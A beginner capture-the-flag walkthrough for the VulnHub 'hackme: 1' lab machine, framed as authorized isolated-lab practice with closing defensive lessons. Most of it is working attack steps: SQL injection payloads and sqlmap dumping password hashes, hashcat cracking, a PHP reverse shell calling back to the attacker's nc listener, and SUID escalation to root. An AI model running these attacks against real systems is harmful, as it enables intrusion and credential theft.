# hackme: 1 — VulnHub Walkthrough (Beginner Friendly)

> **Authorized lab use only.** Run this machine inside an isolated virtual network
> (VirtualBox/VMware *host-only* adaptor). Never attack systems you do not own or
> have written permission to test.

| Field | Value |
| --- | --- |
| **Machine** | hackme: 1 |
| **Difficulty** | Easy |
| **Author** | x4bx54 |
| **Released** | 18 Jul 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/hackme-1,330/> |
| **Download** | <https://download.vulnhub.com/hackme/hackme.ova> |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) on VirtualBox, host-only network |
| **Target OS** | Linux (Ubuntu 18.04) |

---

## 0. What you will learn

This is a **beginner** machine (the author calls it "beginner difficulty"). By the
end you will have practised the full, real-world chain:

- Discovering a host and its open ports on an isolated lab network.
- Enumerating a small PHP web application and finding hidden pages.
- Exploiting a **SQL injection** to dump a database (manually in the browser, and
  optionally with `sqlmap`).
- Cracking a weak **unsalted MD5** password hash and re-using the credential.
- Turning an **unrestricted file upload** into a PHP reverse shell.
- Escalating to `root` by abusing a **SUID binary**.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running, be able to
import an `.ova`, and have both VMs on the same host-only network.

> **Note on flags:** hackme: 1 does **not** ship `user.txt`/`root.txt` flag files.
> The objective is simply to reach a `root` shell. Don't be confused if your
> `find / -name "*.txt"` searches come up empty — that is by design.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

```bash
# Identify your own IP + subnet first (the "eth0" adapter is the lab NIC)
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:4b:1a:2c brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
       valid_lft forever preferred_lft forever
```

> **How to read it:** Kali's lab interface usually holds a `192.168.56.x`
> (VirtualBox host-only) or `192.168.19x.x` (VMware) address. The target will
> live on the **same** subnet.

```bash
# ARP-scan the subnet to list live hosts (fast, uses ARP not TCP)
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:4b:1a:2c, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:00       (Unknown: locally administered)
192.168.56.100  08:00:27:ab:cd:ef       PCS Systemtechnik GmbH
192.168.56.101  08:00:27:11:22:33       PCS Systemtechnik GmbH
3 packets received by filter, 0 packets dropped by kernel
```

```bash
# If arp-scan is unavailable, netdiscover does the same job
sudo netdiscover -r 192.168.56.0/24
```

![arp scan showing the target host](images/01-recon.png)

**Target IP:** `192.168.56.101`

---

## 2. Enumeration — open ports and services

```bash
# Fast full-TCP port sweep, then service/version detection on the open ports
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.34 ((Ubuntu))
|_http-server-header: Apache/2.4.34 (Ubuntu)
|_http-title: hackme
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:**
> - `-p-` scans all 65,535 TCP ports.
> - `-sV` guesses the **service and version** behind each open port.
> - `-sC` runs Nmap's default scripts (banners, safe checks).
> - Note every open port — each one is an *attack surface*. Here: SSH (22) and a
>   web server (80).

Now enumerate the web server for hidden files and directories:

```bash
gobuster dir -u http://192.168.56.101/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
# (dirb or ffuf work just as well)
```

```text
/index.php           (Status: 200) [Size: 768]
/login.php           (Status: 200) [Size: 1052]
/register.php        (Status: 200) [Size: 1288]
/welcome.php         (Status: 200) [Size: 1420]
/uploads/            (Status: 301) [Size: 315]  --> http://192.168.56.101/uploads/
```

![nmap and directory scan output](images/02-nmap.png)

> **Why it matters:** `/login.php` plus `/register.php` means we can **create our
> own account**. `uploads/` hints that the app lets users store files — a classic
> file-upload weakness. And `welcome.php` is the page you reach **after** logging
> in, so it is where the interesting application logic lives.

---

## 3. Foothold — gaining the first shell

### 3.1 Create an account and log in

Browse to `http://192.168.56.101/register.php` and register a throwaway user
(e.g. `student` / `student123`), then log in at `login.php`.

> **Why it works:** the app is only gated by a login, and it lets *anyone* sign
> up. Signing up is not the vulnerability by itself — it simply unlocks the search
> feature on `welcome.php`, which *is* the vulnerable code.

### 3.2 Find the SQL injection

`welcome.php` has a search box that looks up "books". Type a single quote `'`
into it.

```text
Search results
You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near ''%'' at line 1
```

> **Why it works:** that database error means our `'` broke out of the SQL string
> and changed the query. That is **SQL injection**. The search value is dropped
> straight into a query such as
> `SELECT * FROM books WHERE title LIKE '%<our input>%'`.

Establish how many columns the query returns with `ORDER BY`:

```sql
' ORDER BY 3 #          -- works (3 columns exist)
' ORDER BY 4 #          -- error (there is no 4th column)
```

Then use a `UNION SELECT` to print our own values in the page:

```sql
' UNION SELECT 1, user(), database() #
```

```text
Search results
1    root@localhost     webapphacking
```

Now dump the `users` table (the database is `webapphacking`, the table is `users`):

```sql
' UNION SELECT 1, username, password FROM users #
```

```text
Search results
1    admin        21232f297a57a5a743894a0e4a801fc3
1    superadmin   2386acb2cf356944177746fc92523983
```

> **Why it works:** because the whole query result is printed into the HTML table,
> any columns we `UNION SELECT` become visible. We chose the `users` table because
> `database()` told us where to look, and the columns `username`/`password` are the
> obvious credential pair. (On your build the usernames and hashes will be the same
> shape but read the values live — see the note below.)

**Optional — automate with sqlmap.** Copy your `PHPSESSID` cookie from the browser
(login is required first), then:

```bash
sqlmap -u "http://192.168.56.101/welcome.php" \
  --data="search=test" \
  --cookie="PHPSESSID=<your-session-id>" \
  --batch --dbs --dump
```

```text
available databases [2]:
[*] information_schema
[*] webapphacking

Database: webapphacking
Table: users
[2 entries]
+-----------+----------------------------------+
| username  | password                         |
+-----------+----------------------------------+
| admin     | 21232f297a57a5a743894a0e4a801fc3 |
| superadmin| 2386acb2cf356944177746fc92523983 |
+-----------+----------------------------------+
```

### 3.3 Crack the hash

`2386acb2cf356944177746fc92523983` is a 32-character hex string: an **unsalted
MD5** hash. Paste it into an online lookup like
[CrackStation](https://crackstation.net/) (or crack it locally):

```bash
# Save the hash, then crack it with hashcat (mode 0 = raw MD5)
echo "2386acb2cf356944177746fc92523983" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 hash.txt --show
```

```text
2386acb2cf356944177746fc92523983:<cracked-password>
```

> **Why it works:** unsalted MD5 of a weak dictionary word is instantly reversible
> with a wordlist. `<cracked-password>` is a short, common password — crack it on
> your own instance to see the exact value. This is exactly why strong hashing
> (bcrypt/argon2 + salt) and strong passwords matter.

![SQL injection dumping the users table](images/03-enum.png)

### 3.4 Log in as an administrator

Log back in at `login.php` as `superadmin` with the cracked password. You are now
redirected to `welcomeadmin.php`, an admin page that includes a **file upload**
feature.

### 3.5 The reverse shell

The upload accepts a `.php` file, so we upload a PHP reverse shell instead of an
image.

```bash
# 1) On Kali, start a listener
nc -lvnp 4444

# 2) Copy the pentestmonkey PHP reverse shell and edit the callback IP/port
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
#   set $ip   = '192.168.56.10';   (your Kali IP)
#   set $port = 4444;
```

Upload `shell.php` through the admin page, then trigger it in the browser (the
app stores it under `/uploads/`):

```bash
# Request the uploaded shell — it connects back to our nc listener
curl http://192.168.56.101/uploads/shell.php
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 42318
Linux hackme 4.15.0-... #1 SMP ... x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** a web server only runs the files you *ask it to run*. By
> storing a `.php` file inside the web root and then requesting it, the Apache/PHP
> engine executes our code **as the `www-data` user** — a remote shell.

Upgrade the dumb shell to a fully interactive one:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then press Ctrl+Z, and on your Kali terminal run:
stty raw -echo; fg
# then press Enter twice, and inside the target shell:
export TERM=xterm
```

![The reverse shell as www-data](images/04-foothold.png)
![Shell as www-data](images/05-shell.png)

> **Flags:** there are no flag files on this box — proceed straight to privilege
> escalation.

---

## 4. Privilege escalation — becoming root

Run the standard quick checks:

```bash
id; whoami
sudo -l                                   # can we run anything as root?
find / -perm -4000 -type f 2>/dev/null    # SUID binaries
cat /etc/crontab; ls -la /etc/cron*       # scheduled jobs
uname -a; cat /etc/os-release             # kernel/OS version
```

```text
$ sudo -l
[sudo] password for www-data:
Sorry, user www-data may not run sudo on hackme.

$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
/home/legacy/touchmenot          <-- unusual: a SUID binary in a home directory
```

> **Why it matters:** most of these are normal system binaries. The odd one out is
> `/home/legacy/touchmenot` — a custom, non-standard binary that the system owner
> has given the **SUID** bit and made **owned by root**. When a program is SUID and
> owned by root, it runs with **root's privileges** no matter who launches it.

Inspect and run it:

```bash
ls -la /home/legacy/touchmenot
file  /home/legacy/touchmenot
/home/legacy/touchmenot
```

```text
-rwsr-xr-x 1 root root  ... /home/legacy/touchmenot
/home/legacy/touchmenot: setuid ELF 64-bit LSB executable ...

[ back to a root prompt ]
# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** `touchmenot` is a deliberately hidden privilege-escalation
> tool. Because it is SUID-root it spawns a shell that is already `root`, so simply
> executing it hands us a root shell. On a real (unintended) host, an unfamiliar
> SUID binary is a huge red flag — always enumerate `-perm -4000` and check every
> result against [GTFOBins](https://gtfobins.github.io/).

You now have `root`:

```bash
# Confirm
id
# (There is no root.txt on this box; a root shell is the win.)
```

![Executing the SUID binary to become root](images/06-privesc.png)
![Root shell](images/07-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | SQL injection via unparameterised search query | `welcome.php` search box | Full read of the `webapphacking` database, including password hashes |
| 2 | Weak password storage (unsalted MD5) | `users.password` column | Hashes trivially cracked, admin account taken over |
| 3 | Unrestricted file upload (`.php` accepted) | Admin upload page (`welcomeadmin.php`) | Remote code execution as `www-data` |
| 4 | Hidden SUID-root binary | `/home/legacy/touchmenot` | Local privilege escalation to `root` |

## 6. Defensive lessons (blue team)

- **Parameterise every query.** Use prepared statements / an ORM so user input can
  never change SQL structure. This alone kills the initial SQL injection.
- **Store passwords with a slow, salted KDF** (bcrypt, scrypt, Argon2). A salted
  hash makes dumped hashes useless to precomputed/wordlist cracking.
- **Validate uploads by content, not filename.** Allow-list safe types, verify the
  real MIME/magic bytes, store files **outside** the web root, and disable script
  execution in the upload directory (`php_admin_flag engine off`, or serve uploads
  from a non-executing location).
- **Never leave SUID-root binaries lying around.** Audit `find / -perm -4000` on a
  schedule; remove anything that isn't a known system binary. Turn on file-integrity
  monitoring (e.g. AIDE/Tripwire) to catch new SUID files.
- **Least privilege for the web server.** Run PHP-FPM/Apache as a locked-down user
  with no shell (`/usr/sbin/nologin`) and confine it (containers, AppArmor/SELinux)
  so a web RCE is far less useful.
- **Detection ideas:** watch for `400`-style SQL errors and `UNION SELECT` /
  `information_schema` strings in access logs; alert on new `.php` files appearing
  under upload paths; flag creation of unexpected SUID files and outbound
  connections from the web user (reverse shells).

---

## 7. References

- VulnHub entry: <https://vulnhub.com/entry/hackme-1,330/>
- Download mirror: <https://download.vulnhub.com/hackme/hackme.ova>
- Community writeups consulted:
  - [hackme: 1: Vulnhub Walkthrough — Hacking Articles](https://www.hackingarticles.in/hackme-1-vulnhub-walkthrough/)
- Docs / tools:
  - [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
  - [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
  - [GTFOBins](https://gtfobins.github.io/)
  - [pentestmonkey — PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-nmap.png` — port/service scan and directory discovery
- [ ] `images/03-enum.png` — SQL injection dumping the `users` table
- [ ] `images/04-foothold.png` — uploading / triggering the PHP reverse shell
- [ ] `images/05-shell.png` — shell as `www-data`
- [ ] `images/06-privesc.png` — finding/running `/home/legacy/touchmenot`
- [ ] `images/07-root-flag.png` — proof of `root` (`id` shows `uid=0`)

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
